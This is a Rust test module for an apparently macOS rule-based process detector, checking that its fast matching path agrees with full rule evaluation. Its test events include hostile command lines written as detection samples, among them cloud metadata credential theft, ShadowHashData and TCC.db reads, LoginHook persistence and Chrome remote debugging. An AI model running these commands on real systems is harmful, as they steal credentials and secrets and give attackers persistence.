            image(format!("{} z", f.executable)),
            both(&str::to_uppercase),
            both(&|t| t.replace(['k', 'K'], "\u{212A}")),
            both(&|t| t.replace(['i', 'I'], "\u{130}")),
            both(&|t| t.replace('s', "\u{17F}")),
            both(&short),
            both(&|_| String::new()),
        ]
    }

    /// The fast path is the evaluator's answer, not an estimate of it: for every shipped rule
    /// and every event below, `evaluate`, which asks only the rules of its kind whose texts an
    /// event holds, gives the same matches in the same order as `evaluate_each`, which asks
    /// every rule of its kind. The events are made from each rule's own values, so that every
    /// rule meets events it matches, with their samples, the drills, and the same in every
    /// variant `variants` and `file_variants` make; a few are padded to long lines.
    #[test]
    fn asking_only_the_rules_a_start_can_match_gives_the_same_matches() {
        let rules = Rules::shipped();
        assert!(
            rules.layouts.iter().all(|l| l.texts.is_some()),
            "the texts' automata were built"
        );
        let (mut base, mut files) = starts_from_rules();
        for (_, hit, miss) in high_samples() {
            base.push(hit);
            base.push(miss);
        }
        for (_, hit, miss) in file_high_samples() {
            files.push(hit);
            files.push(miss);
        }
        // A rule whose value is a regular expression meets a path it matches only when one is
        // written for it: the `.pth` rule.
        files.push(file(
            "/usr/bin/python3",
            "/Library/Frameworks/Python.framework/Versions/3.12/lib/python3.12/site-packages/x.pth",
            None,
        ));
        for (_, image, args) in DRILL {
            base.push(drill_start(image, args));
        }
        // Translated rules whose values alone make no event they match: several selections on
        // one field, a regular expression, a field that must be there.
        let app = "/Applications/Example.app/Contents/MacOS/Example";
        let translated: [(&str, &[&str], &str); 13] = [
            (
                "/usr/bin/curl",
                &[
                    "curl",
                    "-L",
                    "https://drive.google.com/uc?export=download&confirm=no_antivirus&id=x",
                ],
                "/bin/zsh",
            ),
            (
                "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
                &[
                    "Google Chrome",
                    "--remote-debugging-port=9222",
                    "--user-data-dir=/tmp/p",
                ],
                "/bin/zsh",
            ),
            (
                "/usr/bin/curl",
                &[
                    "curl",
                    "http://169.254.169.254/latest/meta-data/iam/security-credentials/role",
                ],
                "/bin/zsh",
            ),
            (
                "/usr/bin/defaults",
                &[
                    "defaults",
                    "read",
                    "/var/db/dslocal/nodes/Default/users/x.plist",
                    "ShadowHashData",
                ],
                "/bin/zsh",
            ),
            (
                "/usr/bin/defaults",
                &[
                    "defaults",
                    "write",
                    "/Library/Preferences/com.apple.SoftwareUpdate.plist",
                    "AutomaticDownload",
                    "-bool",
                    "false",
                ],
                "/bin/zsh",
            ),
            (
                "/usr/bin/sqlite3",
                &[
                    "sqlite3",
                    "/Users/example/Library/Application Support/com.apple.TCC/TCC.db",
                    "select 1",
                ],
                "/bin/zsh",
            ),
            (
                "/usr/bin/defaults",
                &[
                    "defaults",
                    "write",
                    "com.apple.Safari",
                    "IncludeDevelopMenu",
                    "-bool",
                    "true",
                ],
                "/bin/zsh",
            ),
            (
                "/bin/sh",
                &["sh", "-c", "csrutil status | grep enabled"],
                app,
            ),
            (
                app,
                &["Example", "-e", "const cp = require('child_process')"],
                "/sbin/launchd",
            ),
            (
                "/sbin/mount_smbfs",
                &["mount_smbfs", "//user@server/share", "/Volumes/share"],
                "/bin/zsh",
            ),
            (
                "/usr/sbin/networksetup",
                &["networksetup", "-connectpppoeservice", "Office"],
                "/bin/zsh",
            ),
            (
                "/usr/bin/defaults",
                &[
                    "defaults",
                    "write",
                    "com.apple.loginwindow",
                    "LoginHook",
                    "/Users/example/hook.sh",
                ],
                "/bin/zsh",
            ),
            (
                "/usr/bin/scp",
                &[
                    "scp",
                    "-o",
                    "StrictHostKeyChecking=no",
                    "/tmp/x",
                    "user@localhost:/tmp/y",
                ],
                "/bin/zsh",
            ),
        ];
        for (image, args, parent) in translated {
            base.push(start(image, args, parent));
        }
        // Elastic's behaviour rules meet the kept samples they match, the reference's events.
        for line in include_str!("../tests/elastic-behaviour/samples.jsonl").lines() {
            let sample: Json = serde_json::from_str(line).unwrap();
            if sample["matches"].as_array().is_some_and(Vec::is_empty) {
                continue;
            }
            match Sample::of(&sample["event"]) {
                Sample::Start(s) => base.push(s),
                Sample::File(f) => files.push(f),
            }
        }
        let mut grep = start(
            "/usr/bin/grep",
            &["grep", "-i", "vmware", "Manufacturer"],
            "/bin/zsh",
        );
        grep.user_id = Some(501);
        base.push(grep);
        files.push(file(
            "/usr/bin/java",
            "/opt/papercut/server/lib/Udx.class",
            None,
        ));
        files.push(file(
            "/Applications/Microsoft Word.app/Contents/MacOS/Microsoft Word",
            "/Users/example/Library/Containers/com.microsoft.Word/Data/~$x.zip",
            Some("/Users/example/Library/Containers/com.microsoft.Word/Data/x.tmp"),
        ));
        // The program starts the event level's own tests write to the log.
        let logged: [(&str, &str, &[&str]); 7] = [
            (
                "/bin/sh",
                "/bin/dd",
                &["dd", "if=/dev/zero", "bs=1", "count=9"],
            ),
            ("/bin/zsh", "/bin/dd", &["dd", "if=a", "of=b"]),
            (
                "/bin/zsh",
                "/usr/bin/sw_vers",
                &["sw_vers", "-productVersion", "m"],
            ),
            ("/bin/zsh", "/usr/bin/base64", &["base64", "-d", "in.txt"]),
            ("/bin/zsh", "/usr/bin/split", &["split", "big.bin"]),
            ("/bin/zsh", "/usr/bin/git", &["git", "status", "--short"]),
            ("/bin/zsh", "/usr/bin/curl", &["curl", "-u", "m"]),
        ];
        for (parent, image, args) in logged {
            base.push(start(image, args, parent));
        }
        let long = "a".repeat(4096);
        let padded: Vec<ProcessStart> = high_samples()
            .into_iter()
            .map(|(_, hit, _)| changed(&hit, |t| format!("{long} {t} {long}")))
            .collect();
        let mut seen = BTreeSet::new();
        base.retain(|s| {
            seen.insert((
                s.executable.clone(),
                s.args.clone(),
                s.parent_executable.clone(),
            ))
        });
        let mut seen = BTreeSet::new();
        files.retain(|f| seen.insert((f.path.clone(), f.executable.clone())));
        let corpus: Vec<ProcessStart> = base.iter().flat_map(variants).chain(padded).collect();
        let file_corpus: Vec<FileEvent> = files.iter().flat_map(file_variants).collect();

        // Both ways of asking, over the events in parts on every core: asking every rule is
        // what takes the time. Returns how many matches, and the rules that matched.
        let threads = std::thread::available_parallelism().map_or(4, |n| n.get());
        let same = |events: Vec<Subject>| -> (usize, BTreeSet<&'static str>) {
            let part = events.len().div_ceil(threads).max(1);
            std::thread::scope(|scope| {
                let parts: Vec<_> = events
                    .chunks(part)
                    .map(|events| {
                        scope.spawn(move || {
                            let mut matched = (0, BTreeSet::new());
                            for &s in events {
                                let fast: Vec<&str> =
                                    rules.evaluate(s).iter().map(|m| m.file).collect();
                                let each: Vec<&'static str> =
                                    rules.evaluate_each(s).iter().map(|m| m.file).collect();
                                assert_eq!(fast, each, "{s:?}");
                                matched.0 += each.len();
                                matched.1.extend(each);
                            }
                            matched
                        })
                    })
                    .collect();
                parts.into_iter().map(|p| p.join().unwrap()).fold(
                    (0, BTreeSet::new()),
                    |(n, mut all), (m, files)| {
                        all.extend(files);
                        (n + m, all)
                    },
                )
            })
        };
        let (matched, mut rules_matched) = same(corpus.iter().map(Subject::Start).collect());
        let (file_matched, file_rules) = same(file_corpus.iter().map(Subject::File).collect());
        rules_matched.extend(file_rules);
        // The corpus has teeth: every rule that is evaluated meets an event it matches.
        let unmatched: Vec<&str> = rules
            .rules
            .iter()
            .filter(|l| !matches!(l.placement, Placement::NotEvaluated(_)))
            .map(|l| l.file)
            .filter(|f| !rules_matched.contains(f))
            .collect();
        assert!(matched > corpus.len() / 4, "{matched} of {}", corpus.len());
        assert!(
            file_matched > file_corpus.len() / 8,
            "{file_matched} of {}",
            file_corpus.len()
        );
        assert_eq!(unmatched, Vec::<&str>::new());
    }

    /// Asking only the rules whose texts a start holds is what lets the watcher keep up with a
    /// Mac that builds, where most starts match nothing: an ordinary start asks no rule, and
    /// the drill asks its own and few others.
    #[test]
    fn a_start_asks_only_the_rules_whose_texts_it_holds() {
        let rules = Rules::shipped();
        let asked = |s: &ProcessStart| -> Vec<&str> { asked_of(rules, s) };
        let git = start("/usr/bin/git", &["git", "status", "--short"], "/bin/zsh");
        assert_eq!(asked(&git), Vec::<&str>::new());
        let compile = start(
            "/usr/bin/clang",
            &["clang", "-O2", "-c", "src/file1.c", "-o", "obj/file1.o"],
            "/bin/zsh",
        );
        assert_eq!(asked(&compile), Vec::<&str>::new());
        let (_, image, args) = DRILL[0];
        let dd = asked(&drill_start(image, args));
        assert!(dd.contains(&by_id(rules, BINARY_PADDING).file), "{dd:?}");
        assert!(dd.len() <= 3, "{dd:?}");
    }

    /// Case is folded one character at a time, as the evaluator folds it, not as a word is
    /// lower-cased: a capital sigma at the end of a word is a small sigma, not a final one.
    #[test]
    fn case_is_folded_one_character_at_a_time() {
        let rules = Rules::load(&[(
            "invented/sigma.yml",
            invented(
                "    selection:\n        CommandLine|contains: 'οσ'\n    condition: selection\n",
            ),
        )]);
        let s = start("/bin/echo", &["echo", "ΟΣ"], "/bin/zsh");
        assert_eq!(rules.evaluate(&s).len(), 1);
        assert_eq!(rules.evaluate_each(&s).len(), 1);
    }

    /// A condition is read for what it needs only where it is read exactly as the evaluator
    /// reads it; anything else, and whatever stands under `not`, needs nothing, so that the
    /// rule is always asked.
    #[test]
    fn a_condition_not_read_exactly_needs_nothing() {
        // `a` needs its text within the image, numbered 0, and at its end, 1; `b` its text
        // within the command line, 2; `c` names a field a start does not give, so it never
        // matches.
        let rules = |condition: &str| {
            Rules::load(&[(
                "invented/condition.yml",
                invented(&format!(
                    "    selection_a:\n        Image|endswith: '/aaa'\n    \
                     selection_b:\n        CommandLine|contains: 'bbb'\n    \
                     selection_c:\n        OriginalFileName: 'ccc'\n    \
                     condition: {condition}\n"
                )),
            )])
        };
        let need = |condition: &str| rules(condition).rules[0].need.clone();
        let a = Need::All(vec![Need::Holds(0), Need::Holds(1)]);
        let b = Need::Holds(2);
        for (condition, needs) in [
            ("selection_a", a.clone()),
            (
                "selection_a AND selection_b",
                Need::All(vec![a.clone(), b.clone()]),
            ),
            (
                "selection_a and selection_b",
                Need::All(vec![a.clone(), b.clone()]),
            ),
            ("selection_a or selection_c", a.clone()),
            ("selection_c", Need::Never),
            ("selection_a and selection_c", Need::Never),
            ("selection_a and not selection_b", a.clone()),
            ("1 of selection_*", Need::OneOf(vec![a.clone(), b.clone()])),
            ("1 of selection_a*", a.clone()),
            ("1 of *_a", a.clone()),
            ("all of selection_a*", a.clone()),
            ("ALL of them", Need::Never),
            ("1 OF them", Need::OneOf(vec![a.clone(), b.clone()])),
        ] {
            assert_eq!(need(condition), needs, "{condition}");
        }
        for condition in [
            "not selection_a",
            "selection_a or not selection_b",
            "selection_a and selection_b)",
            "1 of selection_?",
            "all of sel*_a*",
        ] {
            assert_eq!(need(condition), Need::Any, "{condition}");
        }
        // `and` binds closer than `or`, on either side.
        for condition in [
            "selection_a or selection_b and selection_a",
            "selection_a and selection_b or selection_b",
        ] {
            assert!(matches!(need(condition), Need::OneOf(_)), "{condition}");
        }
        // A selection may be called `1`, and then `1` without `of` is that selection.
        let named_one = Rules::load(&[(
            "invented/one.yml",
            invented(
                "    '1':\n        Image|endswith: '/one'\n    \
                 selection_a:\n        Image|endswith: '/aaa'\n    \
                 condition: 1 or selection_a\n",
            ),
        )]);
        let one = start("/bin/one", &["one"], "/bin/sh");
        assert_eq!(named_one.evaluate_each(&one).len(), 1);
        assert_eq!(named_one.rules[0].need, Need::Any);
    }

    /// A rule is asked only when its texts stand where they must: a value's first run at the
    /// start of the field unless something may stand before it, its last run at the end unless
    /// something may stand after it, its longest run anywhere; under `all`, every value's. A
    /// value of wildcards alone, or one that is not a string, wants no text, and its rule is
    /// asked. Where a rule is not asked, the evaluator finds no match.
    #[test]
    fn a_rule_is_asked_when_its_texts_stand_where_they_must() {
        let load = |detection: &str| {
            Rules::load(&[(
                "invented/values.yml",
                invented(&format!(
                    "    selection:\n{detection}    condition: selection\n"
                )),
            )])
        };
        let ask = |detection: &str, image: &str, command_line: &str| -> bool {
            let rules = load(detection);
            let s = start(image, &[command_line], "/bin/sh");
            let asked = !asked_of(&rules, &s).is_empty();
            assert!(asked || rules.evaluate_each(&s).is_empty(), "{detection}");
            asked
        };
        let begins = "        CommandLine|startswith: 'ab*cde'\n";
        assert!(ask(begins, "/bin/x", "ab cde"));
        assert!(ask(begins, "/bin/x", "ab cde z"));
        assert!(!ask(begins, "/bin/x", "z ab cde"));
        assert!(!ask(begins, "/bin/x", "ab cd"));
        let ends = "        Image|endswith: '/xyz'\n";
        assert!(ask(ends, "/bin/xyz", "x"));
        assert!(!ask(ends, "/bin/xyz2", "x"));
        let every = "        CommandLine|contains|all:\n            - 'xyz'\n            - 'uvw'\n";
        assert!(ask(every, "/bin/x", "uvw xyz"));
        assert!(!ask(every, "/bin/x", "xyz"));
        for anything in ["        CommandLine|contains: '*'\n", "        Image: 1\n"] {
            assert!(ask(anything, "/bin/x", "z"), "{anything}");
        }
        let wildcards = load("        CommandLine|contains: '*?'\n");
        assert_eq!(
            wildcards.layouts[0].texts.as_ref().map(|t| t.count),
            Some(0)
        );
    }
}
